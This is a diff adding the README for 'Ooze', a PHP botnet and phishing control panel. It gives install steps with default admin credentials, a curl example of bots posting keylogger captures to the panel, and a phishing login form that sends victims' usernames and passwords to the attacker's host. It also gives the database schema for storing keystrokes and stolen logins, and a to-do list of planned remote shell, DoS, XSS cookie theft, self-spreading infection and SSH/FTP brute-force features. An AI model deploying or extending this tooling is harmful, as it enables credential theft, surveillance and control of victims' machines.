@@ -1,0 +1,142 @@
+
+
+                                                                                                                                                
+     OOOOOOOOO                                                           
+   OO:::::::::OO                                                         
+ OO:::::::::::::OO                                                       
+O:::::::OOO:::::::O                                                      
+O::::::O   O::::::O   ooooooooooo   zzzzzzzzzzzzzzzzz    eeeeeeeeeeee    
+O:::::O     O:::::O oo:::::::::::oo z:::::::::::::::z  ee::::::::::::ee  
+O:::::O     O:::::Oo:::::::::::::::oz::::::::::::::z  e::::::eeeee:::::ee
+O:::::O     O:::::Oo:::::ooooo:::::ozzzzzzzz::::::z  e::::::e     e:::::e
+O:::::O     O:::::Oo::::o     o::::o      z::::::z   e:::::::eeeee::::::e
+O:::::O     O:::::Oo::::o     o::::o     z::::::z    e:::::::::::::::::e 
+O:::::O     O:::::Oo::::o     o::::o    z::::::z     e::::::eeeeeeeeeee  
+O::::::O   O::::::Oo::::o     o::::o   z::::::z      e:::::::e           
+O:::::::OOO:::::::Oo:::::ooooo:::::o  z::::::zzzzzzzze::::::::e          
+ OO:::::::::::::OO o:::::::::::::::o z::::::::::::::z e::::::::eeeeeeee  
+   OO:::::::::OO    oo:::::::::::oo z:::::::::::::::z  ee:::::::::::::e 
+     OOOOOOOOO        ooooooooooo   zzzzzzzzzzzzzzzzz    eeeeeeeeeeeeee 
+
+                      Coded by CoolerVoid :: coolerlair@gmail.com         
+			Seg Out 19 01:44:32 BRST 2015                                          
+
+
+About Ooze
+====================================
+
+  Ooze is a manager of Botnet and Phishing, have a simple web shell and simple Auth and ACL.
+
+
+
+To install:
+
+$ cp -rf /Ooze /var/www/html
+$ chmod 755 -R /var/www/html/Ooze
+$ chmod o+w /var/www/html/Ooze/db/ronin.db
+
+Go to: 	
+	http://localhost/Ooze/view/login.php
+
+Put it: 
+	login: admin
+	password: 1234
+
+Change your password at user manager menu...
+
+
+
+About botnets
+================
+
+Botnet send Keylogger information via HTTP method POST example with curl:
+---
+$ curl \
+-X POST \
+--data 'secret_code=testbot&name="Test name"&date=11/11/2032&system="Windows 7"&ip="127.0.0.1"&keyboard="something test \n test test \n"' \
+http://localhost/Ooze/controller/register_machine.php
+---
+You can use sockets in C or C++ for example etc...
+
+secret_code param is the key to register information, you can change this static variable at directory "Ooze/controller" in files  
+"register_machine.php" and "register_phishing.php".
+
+
+About Phishing
+================
+
+	When  writing passwords in TXT file, this is visible to others, so is not cool, good idea is store some password  
+like a database, with Ooze you can store  login and passwords and url(site of phishing), loohk 
+
+phishing.html (look name of fields)
+----
+ <form method="post" action="http://YOUR_HOST/Ooze/controller/register_phishing.php">
+        <p><input type="text" name="name" value="" placeholder="Username or Email"></p>
+        <p><input type="password" name="password" value="" placeholder="Password"></p>
+        <input id="1" type="hidden" name="secret_code" value="testbot">
+	<input id="2" type="hidden" name="url" value="Name of site site">
+        <p class="submit"><input type="submit" name="commit" value="Login"></p>
+      </form>
+----
+
+
+
+
+
+
+
+DATABASE tables if you need create "Ooze/db/ronin.db" with SQLite3
+====================================================================
+
+CREATE TABLE userronin (
+ id INTEGER PRIMARY KEY AUTOINCREMENT,
+ login varchar(30),
+ pass varchar(32),
+ mail varchar(80),
+ last_ip varchar(15),
+ owner varchar(12),
+ created_at TIMESTAMP,
+ updated_at TIMESTAMP
+);
+
+CREATE TABLE machine_report (
+ id INTEGER PRIMARY KEY AUTOINCREMENT,
+ name varchar(30),
+ date varchar(30),
+ system varchar(64),
+ ip varchar(32),
+ keyboard TEXT
+);
+
+CREATE TABLE phishing (
+ id INTEGER PRIMARY KEY AUTOINCREMENT,
+ name varchar(128),
+ password varchar(128),
+ date varchar(30),
+ url varchar(30)
+);
+
+INSERT INTO "userronin" (login,pass,owner) VALUES ('admin', '$2a$12$YoZTUHs9/SFD9OzvAWPUbePYLHDBcC3egmanr9h5pJO0UgvUwTWcq', 'admin');
+
+
+DB communication
+==================
+
+DSN and CRUD Follow class "Ooze/helper/class.crud.php"
+
+
+
+TODO LIST
+==========
+
+---- need add this features
+*Add upload file option
+*Add cookie reader of XSS stealers
+*Add botnet manager
+	|=control CMD per shell
+	|=screenshot if desktop...
+	|=options to activate DoS
+	|=option to download a file of machine
+	|=option to destroy botnet and clear all logs
+	|=option to send file at messenger to infect other peoples
+	|=option to use this machine to do brute force at SSH or FTP
